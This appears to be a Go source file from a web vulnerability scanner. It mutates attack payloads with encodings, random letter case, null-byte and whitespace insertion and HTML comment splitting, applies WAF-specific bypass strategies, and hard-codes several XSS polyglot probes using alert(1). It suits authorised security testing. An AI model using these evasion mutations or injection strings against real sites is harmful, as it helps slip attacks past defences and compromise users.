package payload

import (
	"context"
	"math/rand"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/aydocs/fang/pkg/models"
)

type Mutator struct {
	encoders []Encoder
	mu       sync.Mutex
	rng      *rand.Rand
}

func NewMutator(encoders []Encoder) *Mutator {
	return &Mutator{
		encoders: encoders,
		rng:      rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

func (m *Mutator) Mutate(ctx context.Context, payload *models.Payload, count int) ([]*models.Payload, error) {
	if count <= 0 {
		count = 5
	}

	var results []*models.Payload

	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	default:
	}

	encodingVariants := m.encodingMutations(ctx, payload, count)
	results = append(results, encodingVariants...)

	caseVariants := m.caseMutations(ctx, payload, count)
	results = append(results, caseVariants...)

	whitespaceVariants := m.whitespaceMutations(ctx, payload, count)
	results = append(results, whitespaceVariants...)

	commentVariants := m.commentMutations(ctx, payload, count)
	results = append(results, commentVariants...)

	polyglotVariants := m.polyglotMutations(ctx, payload, count)
	results = append(results, polyglotVariants...)

	return results, nil
}

func (m *Mutator) MutateWithWAF(ctx context.Context, payload *models.Payload, waf string, count int) ([]*models.Payload, error) {
	if count <= 0 {
		count = 3
	}

	strategies := GetBypassStrategy(waf)
	if len(strategies) == 0 {
		return m.Mutate(ctx, payload, count)
	}

	var results []*models.Payload

	for _, evasion := range strategies {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}

		encoded := ApplyEvasiveEncoding(payload.Value, evasion)
		if encoded != payload.Value {
			p := &models.Payload{
				Value:     encoded,
				Encoded:   encoded,
				Type:      payload.Type,
				Context:   payload.Context,
				WAFBypass: true,
				Params:    payload.Params,
				Headers:   payload.Headers,
				Cookies:   payload.Cookies,
			}
			results = append(results, p)
		}
	}

	if len(results) > count {
		results = results[:count]
	}

	return results, nil
}

func (m *Mutator) encodingMutations(ctx context.Context, base *models.Payload, count int) []*models.Payload {
	var results []*models.Payload
	for _, enc := range m.encoders {
		select {
		case <-ctx.Done():
			return results
		default:
		}

		encoded := enc.Encode(base.Value)
		if encoded == base.Value {
			continue
		}

		p := &models.Payload{
			Value:   base.Value,
			Encoded: encoded,
			Type:    base.Type,
			Context: base.Context,
		}
		results = append(results, p)

		if len(results) >= count {
			break
		}
	}
	return results
}

func (m *Mutator) caseMutations(ctx context.Context, base *models.Payload, count int) []*models.Payload {
	var results []*models.Payload

	m.mu.Lock()
	seed := m.rng.Int63()
	m.mu.Unlock()
	localRng := rand.New(rand.NewSource(seed))

	for i := 0; i < count; i++ {
		select {
		case <-ctx.Done():
			return results
		default:
		}

		variants := randomCaseVariants(base.Value, localRng)
		for _, v := range variants {
			if v != base.Value {
				p := &models.Payload{
					Value:   v,
					Encoded: v,
					Type:    base.Type,
					Context: base.Context,
				}
				results = append(results, p)
				break
			}
		}
	}
	return results
}

func (m *Mutator) whitespaceMutations(ctx context.Context, base *models.Payload, count int) []*models.Payload {
	var results []*models.Payload
	techniques := []string{"tab", "newline", "null_byte", "double_space"}

	for _, tech := range techniques {
		select {
		case <-ctx.Done():
			return results
		default:
		}

		modified := applyWhitespaceMutation(base.Value, tech)
		if modified != base.Value {
			p := &models.Payload{
				Value:   modified,
				Encoded: modified,
				Type:    base.Type,
				Context: base.Context,
			}
			results = append(results, p)
			if len(results) >= count {
				break
			}
		}
	}
	return results
}

func (m *Mutator) commentMutations(ctx context.Context, base *models.Payload, count int) []*models.Payload {
	var results []*models.Payload
	techniques := []string{"html_comment", "xml_comment", "multi_comment"}

	for _, tech := range techniques {
		select {
		case <-ctx.Done():
			return results
		default:
		}

		modified := applyCommentMutation(base.Value, tech)
		if modified != base.Value {
			p := &models.Payload{
				Value:   modified,
				Encoded: modified,
				Type:    base.Type,
				Context: base.Context,
			}
			results = append(results, p)
			if len(results) >= count {
				break
			}
		}
	}
	return results
}

func (m *Mutator) polyglotMutations(ctx context.Context, base *models.Payload, count int) []*models.Payload {
	polyglots := []string{
		"\"><script>alert(1)</script>",
		"\\\";alert(1)//",
		"\" onfocus=\"alert(1)\" autofocus=\"",
		"<script>alert(1)</script>",
		"';alert(1);//",
	}

	_ = base
	var results []*models.Payload

	for _, pl := range polyglots {
		select {
		case <-ctx.Done():
			return results
		default:
		}

		p := &models.Payload{
			Value:   pl,
			Encoded: pl,
			Type:    "polyglot",
			Context: "html",
		}
		results = append(results, p)
		if len(results) >= count {
			break
		}
	}
	return results
}

func randomCaseVariants(input string, rng *rand.Rand) []string {
	var result strings.Builder

	for _, r := range input {
		if rng.Intn(2) == 0 {
			result.WriteRune(unicode.ToLower(r))
		} else {
			result.WriteRune(unicode.ToUpper(r))
		}
	}
	return []string{result.String()}
}

func applyWhitespaceMutation(input string, technique string) string {
	switch technique {
	case "tab":
		return strings.ReplaceAll(input, " ", "\t")
	case "newline":
		return strings.ReplaceAll(input, " ", "\n")
	case "null_byte":
		if len(input) > 0 {
			mid := len(input) / 2
			return input[:mid] + "\x00" + input[mid:]
		}
		return input
	case "double_space":
		return strings.ReplaceAll(input, " ", "  ")
	default:
		return input
	}
}

func applyCommentMutation(input string, technique string) string {
	switch technique {
	case "html_comment":
		chars := strings.Split(input, "")
		if len(chars) < 2 {
			return input
		}
		return strings.Join(chars, "<!-- -->")
	case "xml_comment":
		chars := strings.Split(input, "")
		if len(chars) < 2 {
			return input
		}
		return strings.Join(chars, "<!-->-->")
	case "multi_comment":
		return "<!-->" + input + "<!--"
	default:
		return input
	}
}
